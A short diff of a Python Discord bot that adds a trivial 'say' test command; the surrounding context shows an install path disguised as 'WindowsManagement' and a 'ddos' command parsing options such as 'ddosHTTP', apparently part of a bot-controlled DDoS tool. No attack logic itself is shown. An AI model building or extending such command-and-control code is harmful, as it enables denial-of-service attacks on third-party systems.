@@ -26,6 +26,10 @@ script_dir = os.path.dirname(exe_path)
 path_exist = r"C:\Users\\"+user+"\WindowsManagement\\"
 
 @bot.command()
+async def say(ctx):
+  await ctx.send("test")
+  
+@bot.command()
 async def ddos(ctx, *, user_input):
   listeMots = user_input.split()
   if listeMots[0] == "ddosHTTP":
